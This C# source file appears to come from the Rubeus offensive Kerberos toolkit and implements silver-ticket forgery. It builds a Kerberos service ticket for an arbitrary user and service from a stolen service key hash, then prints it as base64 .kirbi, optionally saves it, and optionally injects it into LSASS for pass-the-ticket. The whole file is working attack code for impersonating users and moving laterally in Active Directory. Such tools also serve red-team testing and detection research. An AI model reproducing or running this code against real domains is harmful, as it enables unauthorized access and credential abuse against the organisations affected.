using System;
using Rubeus.lib.Interop;

namespace Rubeus
{
    public class ForgeTicket
    {
        public static void Silver(string user, string sname, string keyString, Interop.KERB_ETYPE etype, string domain = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
        {
            string[] parts = sname.Split('/');
            if (String.IsNullOrEmpty(domain))
            {
                if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                {
                    Console.WriteLine("[X] Referral TGT requires /domain to be passed.");
                    return;
                }
                else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
                {
                    Console.WriteLine("[X] SPN has to be in the format 'svc/host.domain.com' or 'host@domain.com'.");
                    return;
                }
                else if (parts.Length > 1)
                {
                    domain = parts[1].Substring(parts[1].IndexOf('.') + 1);
                    string[] domainParts = domain.Split(':');
                    if (domainParts.Length > 1)
                    {
                        domain = domainParts[0];
                    }
                }
                else if (sname.Split('@').Length > 1)
                {
                    domain = sname.Split('@')[1];
                }
                else
                {
                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);
                    return;
                }
            }

            
            KRB_CRED cred = new KRB_CRED();
            KrbCredInfo info = new KrbCredInfo();

            // generate a random session key
            Random random = new Random();
            byte[] randKeyBytes;
            if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags);

            byte[] key = Helpers.StringToByteArray(keyString);

  
            byte[] encTicketData = decTicketPart.Encode().Encode();
            byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);

            Ticket ticket = new Ticket(domain.ToUpper(), sname);
            ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);

            cred.tickets.Add(ticket);

            info.key.keytype = (int)etype;
            info.key.keyvalue = randKeyBytes;

            info.prealm = decTicketPart.crealm;

            info.pname.name_type = decTicketPart.cname.name_type;
            info.pname.name_string = decTicketPart.cname.name_string;

            info.flags = flags;

            info.authtime = decTicketPart.authtime;

            info.starttime = decTicketPart.starttime;

            info.endtime = decTicketPart.endtime;

            info.renew_till = decTicketPart.renew_till;

            info.srealm = ticket.realm;

            // [9] sname
            info.sname.name_type = ticket.sname.name_type;
            info.sname.name_string = ticket.sname.name_string;

            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            string kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

            if (Program.wrapTickets)
            {
                // display the .kirbi base64, columns of 80 chararacters
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else
            {
                Console.WriteLine("      {0}", kirbiString);
            }

            Console.WriteLine("");

            if (!String.IsNullOrEmpty(outfile))
            {
                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                filename = Helpers.MakeValidFileName(filename);
                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                {
                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                }
            }

            if (ptt)
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, new LUID());
            }
        }
    }
}
